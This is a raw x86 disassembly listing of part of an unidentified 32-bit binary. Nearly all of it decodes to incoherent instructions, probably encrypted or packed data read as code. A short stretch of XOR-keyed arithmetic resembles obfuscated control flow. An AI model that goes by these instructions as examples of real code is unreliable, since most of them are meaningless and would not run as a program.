  416964:	jl     0x416976
  416966:	inc    esp
  416967:	fisttp WORD PTR cs:[eax]
  41696a:	pop    ss
  41696b:	and    bl,bl
  41696d:	inc    edx
  41696e:	fistp  WORD PTR [esi]
  416970:	push   cs
  416971:	mov    ah,0xf3
  416973:	xchg   BYTE PTR [ecx+eax*4+0x14d76e1],cl
  41697a:	xchg   edi,eax
  41697b:	add    BYTE PTR [ecx],cl
  41697d:	scas   al,BYTE PTR es:[edi]
  41697e:	dec    edi
  41697f:	cmp    eax,0x913595a
  416984:	jle    0x416972
  416986:	fild   DWORD PTR [edx+ecx*4+0x630ce34a]
  41698d:	mov    esi,0x2fbd4254
  416992:	pop    ebp
  416993:	push   ebx
  416994:	popa   
  416995:	pushf  
  416996:	imul   esi,DWORD PTR [ecx+0x4d],0xbb7de242
  41699d:	add    eax,0xa43080c9
  4169a2:	stos   DWORD PTR es:[edi],eax
  4169a3:	cwde   
  4169a4:	lods   eax,DWORD PTR ds:[esi]
  4169a5:	cmc    
  4169a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169a7:	js     0x4169d0
  4169a9:	jp     0x416942
  4169ab:	jl     0x4169ea
  4169ad:	bt     esp,edx
  4169b0:	jbe    0x416941
  4169b2:	(bad)  
  4169b3:	fsub   DWORD PTR [ebx]
  4169b5:	aas    
  4169b6:	in     al,0x6c
  4169b8:	sbb    al,0x9d
  4169ba:	jns    0x4169d0
  4169bc:	lahf   
  4169bd:	hlt    
  4169be:	xchg   ecx,eax
  4169bf:	popa   
  4169c0:	xor    al,0xbf
  4169c2:	fucom  st(0)
  4169c4:	push   esp
  4169c5:	sahf   
  4169c6:	(bad)  
  4169c9:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169cb:	(bad)  gs:0x1653053d
  4169d2:	dec    eax
  4169d3:	enter  0x2364,0x8f
  4169d7:	retf   
  4169d8:	jle    0x4169ea
  4169da:	xchg   DWORD PTR [ebp+0x2b21f84e],ecx
  4169e0:	xor    DWORD PTR [esi-0x1155c7e6],ecx
  4169e6:	out    0xc7,eax
  4169e8:	jg     0x4169c5
  4169ea:	ret    0xf636
  4169ed:	and    BYTE PTR [ebx-0x31],bl
  4169f0:	sub    cl,BYTE PTR [esi+0x6adf4876]
  4169f6:	pop    ecx
  4169f7:	cmp    eax,0xac176efa
  4169fc:	ficomp WORD PTR [ebx-0x523d7a55]
  416a02:	xchg   ebp,eax
  416a03:	call   0xe0c4dcbb
  416a08:	ss dec esp
  416a0a:	sbb    edi,eax
  416a0c:	jns    0x416a1d
  416a0e:	push   0x3a
  416a10:	jmp    0x44d35b88
  416a15:	lds    ebx,FWORD PTR [ebx+edx*8]
  416a18:	cmp    eax,0x4f5876e3
  416a1d:	in     al,0x5d
  416a1f:	ins    DWORD PTR es:[edi],dx
  416a20:	sub    DWORD PTR [esi-0x6d],edx
  416a23:	jmp    0x3856:0x660f9e2f
  416a2a:	into   
  416a2b:	mov    WORD PTR [edi-0x59],gs
  416a2e:	mov    edx,0xb6cc9153
  416a33:	mov    esi,0x13723f73
  416a38:	inc    esi
  416a39:	rep ins DWORD PTR es:[edi],dx
  416a3b:	mov    DWORD PTR [ebp+0x6b],edi
  416a3e:	(bad)  
  416a3f:	out    dx,eax
  416a40:	jnp    0x416a85
  416a42:	rcpps  xmm4,XMMWORD PTR [ebx-0x1f5870d]
  416a49:	mov    cl,0x35
  416a4b:	dec    ebx
  416a4c:	pop    ds
  416a4d:	dec    esi
  416a4e:	mov    ch,0xb8
  416a50:	jl     0x4169ea
  416a52:	sub    al,0xbd
  416a54:	stos   BYTE PTR es:[edi],al
  416a55:	xlat   BYTE PTR ds:[ebx]
  416a56:	cmp    dh,al
  416a58:	in     al,0x1b
  416a5a:	mov    al,ds:0x543b9168
  416a5f:	jno    0x416add
  416a61:	aaa    
  416a62:	sti    
  416a63:	jmp    0x416a72
  416a65:	scas   al,BYTE PTR es:[edi]
  416a66:	push   esi
  416a67:	out    dx,al
  416a68:	jbe    0x416a9d
  416a6a:	xchg   esp,eax
  416a6b:	rcr    DWORD PTR [esi-0x30a5484c],1
  416a71:	outs   dx,BYTE PTR ds:[esi]
  416a72:	adc    al,0x56
  416a74:	mov    eax,ds:0x6e662447
  416a79:	add    DWORD PTR [ebp-0x25],edx
  416a7c:	cmp    eax,0xd77c6ead
  416a81:	jbe    0x416a1e
  416a83:	stc    
  416a84:	js     0x416a8a
  416a86:	cs add eax,0x2ad3992b
  416a8c:	jecxz  0x416a63
  416a8e:	and    eax,0xd4ee75e6
  416a93:	or     al,0x83
  416a95:	xor    BYTE PTR [ebp+0x6762ae2],0xa2
  416a9c:	mov    al,0x3c
  416a9e:	cmp    eax,0x2dffd39d
  416aa3:	jg     0x416a8f
  416aa5:	fwait
  416aa6:	inc    edx
  416aa7:	pop    es
  416aa8:	mov    eax,DWORD PTR [ecx+0x71ec29a2]
  416aae:	sbb    BYTE PTR [esi-0x71392100],cl
  416ab4:	loop   0x416b12
  416ab6:	sbb    DWORD PTR [edx-0x1],ebx
  416ab9:	xor    ch,BYTE PTR [eax+0x42]
  416abc:	mov    cl,0x93
  416abe:	sar    DWORD PTR [eax-0x78],1
  416ac1:	int3   
  416ac2:	mov    dl,0x19
  416ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ac5:	xchg   esp,eax
  416ac6:	ins    BYTE PTR es:[edi],dx
  416ac7:	aaa    
  416ac8:	pop    ebx
  416ac9:	pop    esi
  416aca:	xor    eax,0x129c7744
  416acf:	pop    eax
  416ad0:	xor    BYTE PTR [esi-0x5561efc1],dl
  416ad6:	add    ebx,esi
  416ad8:	pop    esi
  416ad9:	pop    edi
  416ada:	lods   eax,DWORD PTR ds:[esi]
  416adb:	retf   0x8f47
  416ade:	test   bl,0x72
  416ae1:	lods   eax,DWORD PTR ds:[esi]
  416ae2:	(bad)  
  416ae4:	add    BYTE PTR [eax-0x11eaf3bb],al
  416aea:	push   es
  416aeb:	outs   dx,DWORD PTR ds:[esi]
  416aec:	cld    
  416aed:	call   0x44f9eb08
  416af2:	retf   0xe4d5
  416af5:	pop    edi
  416af6:	addr16 (bad) 
  416af8:	mov    eax,0xf60af14f
  416afd:	lods   eax,DWORD PTR ds:[esi]
  416afe:	mov    edx,0x1541d6ca
  416b03:	xor    dl,BYTE PTR [edi+ebp*2+0x41f7ebf8]
  416b0a:	add    DWORD PTR [edi-0x76],esi
  416b0d:	mov    DWORD PTR [ebp*1+0x5af42277],ecx
  416b14:	stc    
  416b15:	xor    DWORD PTR [esp+edx*8+0x7f],0xffffff81
  416b1a:	test   BYTE PTR [edi+eax*2+0x538b2702],ch
  416b21:	pop    es
  416b22:	jmp    0x777527c5
  416b27:	pop    eax
  416b28:	imul   ebx
  416b2a:	call   FWORD PTR ds:0xfb472f8d
  416b30:	pop    esi
  416b31:	retf   0x9a84
  416b34:	pmaxub mm4,QWORD PTR [esp+ebx*8-0x61]
  416b39:	mov    ds:0xe4279df1,eax
  416b3e:	cli    
  416b3f:	push   es
  416b40:	pushf  
  416b41:	je     0x416aee
  416b43:	cld    
  416b44:	(bad)  
  416b45:	xlat   BYTE PTR ds:[ebx]
  416b46:	std    
  416b47:	outs   dx,DWORD PTR ds:[esi]
  416b48:	leave  
  416b49:	repz xchg edx,eax
  416b4b:	inc    esi
  416b4c:	imul   edi,esp,0x86183221
  416b52:	mov    dl,ch
  416b54:	mov    cs,WORD PTR [ebp+0x30d329cf]
  416b5a:	aad    0xaf
  416b5c:	sub    dl,BYTE PTR [esi+0x65]
  416b5f:	add    al,0x7e
  416b61:	pop    ss
  416b62:	iret   
  416b63:	sbb    DWORD PTR [edi+0x5],0x16
  416b67:	jne    0x416aed
  416b69:	cmp    al,0x24
  416b6b:	lods   al,BYTE PTR ds:[esi]
  416b6c:	call   0xb5de3d2d
  416b71:	dec    edi
  416b72:	outs   dx,DWORD PTR ds:[esi]
  416b73:	pusha  
  416b74:	add    BYTE PTR [esi+0x68c309fa],dl
  416b7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b7b:	mov    DWORD PTR [ebx-0x26],ebp
  416b7e:	cwde   
  416b7f:	sbb    bh,al
  416b81:	xchg   ebx,eax
  416b82:	adc    eax,0x3aeef9ab
  416b87:	retf   
  416b88:	sub    dh,0xf1
  416b8b:	fwait
  416b8c:	lahf   
  416b8d:	lea    eax,[edx+0x62]
  416b90:	daa    
  416b91:	pop    ds
  416b92:	add    BYTE PTR [ecx+0x2ffa8f94],ch
  416b98:	pop    edx
  416b99:	mov    bl,0x81
  416b9b:	int    0xe5
  416b9d:	mov    dh,0x11
  416b9f:	and    eax,0x2d7254e0
  416ba4:	popf   
  416ba5:	les    ebx,FWORD PTR ds:0xef6c3d0d
  416bab:	popa   
  416bac:	or     DWORD PTR [ebp+0x50703471],ebx
  416bb2:	adc    al,0xa
  416bb4:	cld    
  416bb5:	scas   eax,DWORD PTR es:[edi]
  416bb6:	pop    esp
  416bb7:	in     al,0x5b
  416bb9:	push   0x6ff9d9b7
  416bbe:	mov    eax,ds:0x7d761bdf
  416bc3:	inc    ecx
  416bc4:	xor    DWORD PTR [ebx+0x21],ebx
  416bc7:	(bad)  
  416bc8:	rol    DWORD PTR [ebx],1
  416bca:	(bad)  [edx+0x7e]
  416bcd:	in     eax,dx
  416bce:	inc    eax
  416bcf:	lds    eax,FWORD PTR [ecx-0x24cf7dd6]
  416bd5:	int3   
  416bd6:	and    ah,cl
  416bd8:	and    DWORD PTR [ecx-0x30],ecx
  416bdb:	add    esi,ecx
  416bdd:	inc    DWORD PTR [esi]
  416bdf:	sar    edx,0xdc
  416be2:	(bad)  
  416be3:	gs fwait
  416be5:	pop    es
  416be6:	inc    ebp
  416be7:	push   esp
  416be8:	scas   eax,DWORD PTR es:[edi]
  416be9:	bound  esp,QWORD PTR fs:[edi]
  416bec:	stc    
  416bed:	pop    ds
  416bee:	push   es
  416bef:	mov    al,0x5c
  416bf1:	jmp    0x4a7a1e4e
  416bf6:	add    al,ch
  416bf8:	lods   eax,DWORD PTR ds:[esi]
  416bf9:	sub    BYTE PTR ss:[ebx],dh
  416bfc:	add    dl,BYTE PTR [edi]
  416bfe:	push   esi
  416bff:	adc    BYTE PTR [eax+0xd36b590],bh
  416c05:	les    ebp,FWORD PTR [eax-0x61]
  416c08:	dec    ecx
  416c09:	ror    DWORD PTR [esi-0x587f9cf7],0x14
  416c10:	and    dl,BYTE PTR [ebx+0x3a]
  416c13:	(bad)  
  416c14:	stc    
  416c15:	rcl    ecx,1
  416c17:	sbb    DWORD PTR [eax+eax*8+0x66],ebp
  416c1b:	inc    ecx
  416c1c:	or     al,0xbd
  416c1e:	popf   
  416c1f:	sar    BYTE PTR [esi],cl
  416c21:	int    0x81
  416c23:	sbb    DWORD PTR [eax-0x8],ebp
  416c26:	add    DWORD PTR [ecx],0x39
  416c29:	test   eax,0xfea3125c
  416c2e:	fsubr  DWORD PTR [edi-0x34]
  416c31:	inc    esp
  416c32:	lods   eax,DWORD PTR ds:[esi]
  416c33:	push   ebp
  416c34:	and    eax,DWORD PTR [ecx-0x793da473]
  416c3a:	sub    eax,0x106cdb72
  416c3f:	retf   
  416c40:	cmp    BYTE PTR [ecx],0xb5
  416c43:	in     eax,dx
  416c44:	sub    DWORD PTR [edi],edi
  416c46:	dec    edi
  416c47:	xor    BYTE PTR [esi],0xdd
  416c4a:	cs aam 0xc7
  416c4d:	cli    
  416c4e:	add    DWORD PTR [esp+eax*2+0x52],ebx
  416c52:	push   edi
  416c53:	sahf   
  416c54:	into   
  416c55:	dec    ecx
  416c56:	dec    esp
  416c57:	mov    BYTE PTR [ebx-0x7],dh
  416c5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c5b:	stos   DWORD PTR es:[edi],eax
  416c5c:	jmp    0x416c91
  416c5e:	push   esp
  416c5f:	call   0x96cc:0xbf8bbbb9
  416c66:	enter  0x65f0,0x1c
  416c6a:	in     eax,0x8f
  416c6c:	jle    0x416c3f
  416c6e:	and    edx,DWORD PTR [eax+0x8a9c03e]
  416c74:	jb     0x416c81
  416c76:	mov    edx,0x10ba41e5
  416c7b:	out    dx,al
  416c7c:	sbb    ecx,DWORD PTR [esi]
  416c7e:	sub    ch,BYTE PTR [esi+0x32e5f753]
  416c84:	sub    BYTE PTR [edi],dl
  416c86:	add    eax,0x9b069143
  416c8b:	jns    0x416c93
  416c8d:	jo     0x416c31
  416c8f:	mov    BYTE PTR [ebp+eax*2-0x66b7c392],0x5a
  416c97:	icebp  
  416c98:	das    
  416c99:	mov    al,0x2f
  416c9b:	ds int3 
  416c9d:	into   
  416c9e:	or     dl,BYTE PTR [bx+di]
  416ca1:	cmp    esp,DWORD PTR [ecx-0x427e5557]
  416ca7:	push   es
  416ca8:	xor    DWORD PTR [edi-0x13],ebx
  416cab:	adc    al,0xb2
  416cad:	push   ecx
  416cae:	or     ah,BYTE PTR [ebp-0x47]
  416cb1:	dec    edx
  416cb2:	loope  0x416c5e
  416cb4:	ss pop edi
  416cb6:	lods   al,BYTE PTR ds:[esi]
  416cb7:	xor    DWORD PTR [eax+0x5563bf7e],edi
  416cbd:	hlt    
  416cbe:	push   esp
  416cbf:	daa    
  416cc0:	out    dx,al
  416cc1:	inc    eax
  416cc2:	ins    BYTE PTR es:[edi],dx
  416cc3:	mov    esi,DWORD PTR [edx-0x6a14075d]
  416cc9:	loopne 0x416d06
  416ccb:	lea    eax,[ebp-0x6c]
  416cce:	cs lahf 
  416cd0:	arpl   WORD PTR [esi-0x45ed17e5],cx
  416cd6:	nop
  416cd7:	add    dh,BYTE PTR [esi-0x66042e97]
  416cdd:	mov    ?,ebx
  416cdf:	dec    eax
  416ce0:	push   ds
  416ce1:	imul   esp,DWORD PTR [ecx],0x10
  416ce4:	and    al,0xd4
  416ce6:	in     al,dx
  416ce7:	jbe    0x416cef
  416ce9:	cmp    BYTE PTR [edx+0x48649831],al
  416cef:	pop    esp
  416cf0:	push   edi
  416cf1:	xor    DWORD PTR [edx+0x5c],ebp
  416cf4:	and    cl,ch
  416cf6:	mov    edx,0x33a1098c
  416cfb:	int3   
  416cfc:	loope  0x416cdb
  416cfe:	scas   al,BYTE PTR es:[edi]
  416cff:	int3   
  416d00:	xor    dh,BYTE PTR [eax]
  416d02:	(bad)  
  416d03:	mov    bh,0xf4
  416d05:	out    dx,eax
  416d06:	xchg   edx,eax
  416d07:	fstp   QWORD PTR [edx]
  416d09:	jmp    0xca48346d
  416d0e:	test   eax,0x1c01d22f
  416d13:	xchg   ebp,eax
  416d14:	jge    0x416d51
  416d16:	cmp    DWORD PTR [edx-0x4],0x747408b8
  416d1d:	fld    DWORD PTR [eax]
  416d1f:	jbe    0x416d42
  416d21:	add    DWORD PTR [edx],ebp
  416d23:	sub    esp,DWORD PTR gs:[ecx-0x757a4008]
  416d2a:	bound  esi,QWORD PTR [edi]
  416d2c:	xor    esp,eax
  416d2e:	and    DWORD PTR ds:0xba7c6adc,eax
  416d34:	lds    edi,FWORD PTR [esi-0x73]
  416d37:	imul   esi,DWORD PTR [esi+0x35],0xfffffff0
  416d3b:	aaa    
  416d3c:	mov    ch,BYTE PTR [ecx-0x16c89b4f]
  416d42:	sub    eax,0x92e5baa5
  416d47:	imul   ecx,edx,0xd371bee7
  416d4d:	cmp    DWORD PTR [edi-0x43],0x2e
  416d51:	jge    0x416db5
  416d53:	push   ds
  416d54:	sbb    esi,DWORD PTR [edi]
  416d56:	test   al,0x51
  416d58:	add    eax,0x920cd1ae
  416d5d:	adc    ebx,DWORD PTR [ecx-0x12]
  416d60:	sahf   
  416d61:	shl    BYTE PTR [esi+0x7868252],cl
  416d67:	in     eax,0x5
  416d69:	pop    ecx
  416d6a:	xchg   ebp,eax
  416d6b:	or     dh,bl
  416d6d:	adc    al,0xb5
  416d6f:	jns    0x416d03
  416d71:	or     ebx,DWORD PTR [ebx+0x1c]
  416d74:	and    eax,0xd2d5cf52
  416d79:	dec    eax
  416d7a:	sahf   
  416d7b:	out    dx,eax
  416d7c:	jae    0x416daa
  416d7e:	mov    gs,WORD PTR [ebx]
  416d80:	adc    al,0x9c
  416d82:	sub    DWORD PTR fs:[ebx-0x5edcd5f4],esi
  416d89:	je     0x416dab
  416d8b:	inc    eax
  416d8c:	dec    eax
  416d8d:	push   ss
  416d8e:	push   0x532d5c94
  416d93:	repnz or DWORD PTR ds:0xff4273dc,edi
  416d9a:	jg     0x416d8f
  416d9c:	sub    BYTE PTR [edx+0x181927a2],bh
  416da2:	loopne 0x416dd1
  416da4:	imul   ebx,esi,0x24
  416da7:	pop    ss
  416da8:	shr    BYTE PTR [eax+0x19],1
  416dab:	mov    eax,ds:0xe6e1fee
  416db0:	add    cl,BYTE PTR [ecx+eiz*1+0x61]
  416db4:	jb     0x416da2
  416db6:	dec    eax
  416db7:	mov    esi,0x50915759
  416dbc:	inc    edx
  416dbd:	pop    ss
  416dbe:	outs   dx,BYTE PTR ds:[esi]
  416dbf:	mov    ds:0x67aa0854,al
  416dc4:	fst    QWORD PTR [eax+0x40]
  416dc7:	adc    BYTE PTR [eax+0x1bb949ed],0x12
  416dce:	adc    cl,BYTE PTR [eax-0x33]
  416dd1:	fcmovbe st,st(2)
  416dd3:	les    ecx,FWORD PTR [ecx-0x5c0db22f]
  416dd9:	push   ecx
  416dda:	pusha  
  416ddb:	and    al,0xb
  416ddd:	xlat   BYTE PTR ds:[ebx]
  416dde:	mov    ebx,0x54e0b53f
  416de3:	fisttp WORD PTR [eax-0x7e2dcfb6]
  416de9:	pop    ecx
  416dea:	in     eax,dx
  416deb:	mov    al,ds:0xd6337efd
  416df0:	add    eax,edi
  416df2:	add    edx,edi
  416df4:	imul   eax,edx
  416df7:	add    eax,DWORD PTR [ebp-0xc]
  416dfa:	mov    DWORD PTR [ebp-0xc],eax
  416dfd:	mov    eax,DWORD PTR [ebp-0xc]
  416e00:	mov    edx,DWORD PTR [ebp-0x20]
  416e03:	sub    eax,edi
  416e05:	sub    edx,edi
  416e07:	xor    eax,esi
  416e09:	xor    edx,esi
  416e0b:	cmp    edx,eax
  416e0d:	jne    0x4102d1
  416e13:	mov    eax,DWORD PTR [ebp-0x1c]
  416e16:	mov    edx,DWORD PTR [ebp-0x20]
  416e19:	xor    eax,esi
  416e1b:	add    eax,edi
  416e1d:	imul   eax,edx
  416e20:	mov    edx,DWORD PTR [ebp-0x24]
  416e23:	xor    edx,esi
  416e25:	add    edx,edi
  416e27:	or     eax,edx
  416e29:	mov    edx,DWORD PTR [ebp-0x18]
  416e2c:	xor    edx,esi
  416e2e:	add    eax,edx
  416e30:	mov    edx,DWORD PTR [ebp-0x18]
  416e33:	xor    edx,esi
  416e35:	add    eax,edx
  416e37:	mov    edx,DWORD PTR [ebp-0x10]
  416e3a:	lea    eax,[eax+edx*1+0x64e5b6]
  416e41:	jmp    0x4191ca
  416e46:	jmp    0x4191bb
  416e4b:	push   ebx
  416e4c:	ja     0x416e99
  416e4e:	cmp    BYTE PTR [ebx],ch
  416e50:	add    al,0xe3
  416e52:	adc    esp,ebp
  416e54:	xchg   edx,eax
  416e55:	push   edx
  416e56:	mov    al,0x7c
  416e58:	popa   
  416e59:	jle    0x416df0
  416e5b:	mov    bh,0x24
  416e5d:	popa   
  416e5e:	bound  ecx,QWORD PTR [edx]
  416e60:	pop    edi
  416e61:	bound  esp,QWORD PTR [edx-0x34]
  416e64:	outs   dx,DWORD PTR ds:[esi]
  416e65:	sbb    edx,0xfffffffc
  416e68:	add    BYTE PTR [edi+0x78],bl
  416e6b:	push   edi
  416e6c:	push   eax
  416e6d:	pop    ss
  416e6e:	push   cs
  416e6f:	push   esp
  416e70:	call   0x804c:0xa1b58209
  416e77:	pop    ebx
  416e78:	push   cs
  416e79:	inc    ebx
  416e7a:	aas    
  416e7b:	into   
  416e7c:	xchg   edi,eax
  416e7d:	sub    ch,0xb4
  416e80:	push   edx
  416e81:	call   0x68b3:0xe3c977e1
  416e88:	or     eax,0xcc29faf5
  416e8d:	es loope 0x416e51
  416e90:	fiadd  WORD PTR [esi+0x7e]
  416e93:	in     eax,0xde
  416e95:	in     al,dx
  416e96:	inc    ebp
  416e97:	imul   si,WORD PTR [eax+0x31b7a7a4],0x6b25
  416ea0:	repz sub ebx,edx
  416ea3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ea4:	retf   
  416ea5:	jb     0x416e9f
  416ea7:	jno    0x416e83
  416ea9:	mov    bh,0x6c
  416eab:	or     DWORD PTR [eax-0x144edb46],esi
  416eb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416eb2:	lahf   
  416eb3:	fild   DWORD PTR [ecx-0x70]
  416eb6:	dec    ecx
  416eb7:	inc    ecx
  416eb8:	cs cli 
  416eba:	retf   
  416ebb:	jbe    0x416edb
  416ebd:	cmp    dl,BYTE PTR [ecx]
  416ebf:	das    
  416ec0:	jmp    0x48c2:0xa1cf16ec
  416ec7:	and    edx,ebx
  416ec9:	inc    edx
  416eca:	not    BYTE PTR [ebx+ebp*4]
  416ecd:	ret    
  416ece:	ss or  cl,dl
  416ed1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ed2:	loop   0x416eb0
  416ed4:	mov    ch,0xb6
  416ed6:	mov    ax,ds:0x1d2473de
  416edc:	mov    ds:0x2c9aa4c1,eax
  416ee1:	(bad)  
  416ee3:	jg     0x416ec8
  416ee5:	popf   
  416ee6:	xor    edi,ebp
  416ee8:	aaa    
  416ee9:	retf   
  416eea:	push   eax
  416eeb:	mov    ds:0xee236d92,eax
  416ef0:	loopne 0x416e97
  416ef2:	jmp    FWORD PTR [ebx+0x41]
  416ef5:	jmp    0x416f2e
  416ef7:	pop    esi
  416ef8:	push   ecx
  416ef9:	pop    edi
  416efa:	sahf   
  416efb:	icebp  
  416efc:	pop    edx
  416efd:	loop   0x416ef6
  416eff:	mov    bh,0xf7
  416f01:	(bad)  [esi+0x2c9eef71]
  416f07:	test   ebx,ecx
  416f09:	iret   
  416f0a:	or     eax,0xdf226c17
  416f0f:	and    al,0x6b
  416f11:	test   al,0xc1
  416f13:	or     BYTE PTR [ebp-0x28f5172b],0xb7
  416f1a:	mov    ch,0xc1
  416f1c:	fstp   DWORD PTR [ebx-0x48]
  416f1f:	pop    esp
  416f20:	jp     0x416f72
  416f22:	ja     0x416f7d
  416f24:	popf   
  416f25:	jb     0x416ead
  416f27:	and    ebp,DWORD PTR [ebp+0x16]
  416f2a:	sub    cl,BYTE PTR [edx]
  416f2c:	adc    ch,cl
  416f2e:	pop    ebx
  416f2f:	fwait
  416f30:	sti    
  416f31:	hlt    
  416f32:	(bad)  
  416f33:	fstp   DWORD PTR [ebx-0x7c00a61f]
  416f39:	push   edx
  416f3a:	outs   dx,BYTE PTR ds:[esi]
  416f3b:	retf   0xd789
  416f3e:	in     al,dx
  416f3f:	xor    eax,0x451c101d
  416f44:	shr    esp,0x1f
  416f47:	imul   ebp,DWORD PTR [edx],0x9a5b9a89
  416f4d:	dec    eax
  416f4e:	add    BYTE PTR [esi],bh
  416f50:	cmp    ch,BYTE PTR [edx]
  416f52:	popf   
  416f53:	ret    
  416f54:	cmc    
  416f55:	add    al,0x89
  416f57:	(bad)  
  416f58:	out    dx,al
  416f59:	sub    cl,BYTE PTR [ebx-0x3a01f37e]
  416f5f:	or     eax,0x399be553
  416f64:	sti    
  416f65:	call   0x3a16:0xedad4562
  416f6c:	add    ebp,DWORD PTR [ebx-0x57]
  416f6f:	push   eax
  416f70:	inc    esi
  416f71:	popf   
  416f72:	mov    esp,ebx
  416f74:	jmp    DWORD PTR [esi-0x25]
  416f77:	jmp    0xd0cae7d3
  416f7c:	or     al,0x35
  416f7e:	ss dec edi
  416f80:	aas    
  416f81:	(bad)  
  416f82:	adc    DWORD PTR gs:[edx+edx*2],eax
  416f86:	ret    0x32c0
  416f89:	push   eax
  416f8a:	lds    ecx,FWORD PTR [eax]
  416f8c:	adc    eax,0x85cd863c
  416f91:	mov    ecx,0x75c96ae3
  416f96:	cdq    
  416f97:	inc    ecx
  416f98:	xchg   edx,eax
  416f99:	cmp    al,0xdc
  416f9b:	jmp    0xe3af:0x76bdb6e7
  416fa2:	aam    0xac
  416fa4:	jo     0x416fab
  416fa6:	inc    edx
  416fa7:	pusha  
  416fa8:	xor    eax,0xd4c2efb3
  416fad:	inc    edx
  416fae:	aaa    
  416faf:	inc    ebx
  416fb0:	jne    0x416ffc
  416fb2:	jmp    0x531c:0x77782678
  416fb9:	rcl    ebx,0xfe
  416fbc:	into   
  416fbd:	mov    bh,0x23
  416fbf:	and    DWORD PTR [edi+0x66],esp
  416fc2:	mov    dh,0xbd
  416fc4:	adc    ah,BYTE PTR [ecx+0x15]
  416fc7:	mov    edi,DWORD PTR [edi]
  416fc9:	and    edx,ecx
  416fcb:	mov    ch,0x1a
  416fcd:	sbb    ebx,DWORD PTR [edi+ebx*4+0x6f2abe90]
  416fd4:	ror    BYTE PTR [eax+0x78faa36],0x4b
  416fdb:	add    BYTE PTR [esi+0x26],ch
  416fde:	cmp    eax,DWORD PTR [ebx+edi*4]
  416fe1:	retf   0xa36c
  416fe4:	das    
  416fe5:	inc    esi
  416fe6:	lods   eax,DWORD PTR ds:[esi]
  416fe7:	jmp    0xd25655f7
  416fec:	fld    QWORD PTR [edx]
  416fee:	in     eax,dx
  416fef:	add    edx,ecx
  416ff1:	and    cl,BYTE PTR [esi-0x13a799e9]
  416ff7:	adc    eax,0x57d5d981
  416ffc:	cwde   
  416ffd:	test   BYTE PTR [edi],ch
  416fff:	or     al,0x7
  417001:	iret   
  417002:	shl    DWORD PTR [edi-0x1c],0x38
  417006:	(bad)  
  417008:	inc    esi
  417009:	ds mov ecx,0xba3247a9
  41700f:	and    BYTE PTR [esi],0x1e
  417012:	inc    ebp
  417013:	int    0xdb
  417015:	mov    ch,0x9
  417017:	cmp    DWORD PTR [eax-0x3cdd6b4a],0x19a9b3b2
  417021:	cmp    al,0x9a
  417023:	mov    cl,0xd6
  417025:	inc    ebp
  417026:	lods   al,BYTE PTR ds:[esi]
  417027:	cmp    al,0x22
  417029:	pop    ds
  41702a:	test   DWORD PTR [esp+esi*8],0xf5de2174
  417031:	sbb    DWORD PTR [ecx-0x1c],esi
  417034:	jae    0x417073
  417036:	push   ebp
  417037:	dec    esi
  417038:	mov    ch,0x3e
  41703a:	imul   ecx,DWORD PTR [eax+0x62ec53ea],0xa548efc9
  417044:	adc    cl,cl
  417046:	add    al,0xbd
  417048:	repnz push ecx
  41704a:	mov    ebp,0xc168b0ce
  41704f:	shl    BYTE PTR [esi+ecx*1+0x4f],1
  417053:	sar    eax,1
  417055:	mov    esi,0xfa94f094
  41705a:	je     0x41709d
  41705c:	xor    al,cl
  41705e:	aad    0x49
  417060:	in     al,0x9
  417062:	push   edi
  417063:	test   DWORD PTR [eax+0x75],ebx
  417066:	or     eax,0xec1133db
  41706b:	leave  
  41706c:	mov    ss,WORD PTR [ebx+0x7ba782d8]
  417072:	dec    edi
  417073:	dec    esp
  417074:	imul   edi,DWORD PTR [edi],0x5f
  417077:	pop    edi
  417078:	mov    ecx,0x92c2ff16
  41707d:	xchg   esp,eax
  41707e:	mov    ebp,0xfa5de492
  417083:	push   esi
  417084:	pop    ecx
  417085:	test   eax,0xb182a457
  41708a:	ss js  0x4170d0
  41708d:	dec    eax
  41708e:	pop    ds
  41708f:	in     eax,dx
  417090:	retf   0xc7a0
  417093:	xchg   ebp,eax
  417094:	std    
  417095:	pop    esp
  417096:	bound  esi,QWORD PTR [edi+0x1c70b03d]
  41709c:	sbb    eax,0x11687984
  4170a1:	pop    ebp
  4170a2:	js     0x4170e2
  4170a4:	mov    WORD PTR [esi-0x55],ds
  4170a7:	aam    0x6d
  4170a9:	inc    eax
  4170aa:	pop    esp
  4170ab:	aam    0xcd
  4170ad:	ja     0x4170fc
  4170af:	je     0x417118
  4170b1:	or     eax,0xf7313bd1
  4170b6:	cmc    
  4170b7:	iret   
  4170b8:	mov    cl,0x8d
  4170ba:	pop    ss
  4170bb:	xchg   esi,eax
  4170bc:	test   al,0x36
  4170be:	gs ds loop 0x4170fa
  4170c2:	sub    ch,BYTE PTR [esi]
  4170c4:	xchg   BYTE PTR [esi-0x53],ah
  4170c7:	mov    al,0x6d
  4170c9:	cmp    al,0xfc
  4170cb:	or     BYTE PTR [edx],dl
  4170cd:	jbe    0x41713c
  4170cf:	push   edx
  4170d0:	cmp    bh,BYTE PTR [eax]
  4170d2:	fwait
  4170d3:	push   ebx
  4170d4:	adc    al,0x93
  4170d6:	dec    ebx
  4170d7:	xchg   esp,eax
  4170d8:	cmp    DWORD PTR [edi],esp
  4170da:	mov    esp,0x36695ab8
  4170df:	push   ss
  4170e0:	int3   
  4170e1:	loop   0x41715f
  4170e3:	ss shr ecx,cl
  4170e6:	fwait
  4170e7:	jl     0x417165
  4170e9:	xlat   BYTE PTR ds:[ebx]
  4170ea:	mov    WORD PTR [edi+edi*4-0x78],ds
  4170ee:	shl    edx,cl
  4170f0:	sti    
  4170f1:	pop    ecx
  4170f2:	xlat   BYTE PTR ds:[ebx]
  4170f3:	fwait
  4170f4:	sbb    edi,DWORD PTR [edi+0x47]
  4170f7:	dec    eax
  4170f8:	inc    ebx
  4170f9:	dec    eax
  4170fa:	xchg   ecx,eax
  4170fb:	inc    ebp
  4170fc:	aas    
  4170fd:	out    0x40,eax
  4170ff:	dec    DWORD PTR [ebx+0x50]
  417102:	fistp  WORD PTR [edx]
  417104:	sbb    DWORD PTR [ebp+esi*2-0x76],ebp
  417108:	and    eax,0x37892844
  41710d:	xchg   edi,eax
  41710e:	fcomp  DWORD PTR [ebx+0x54]
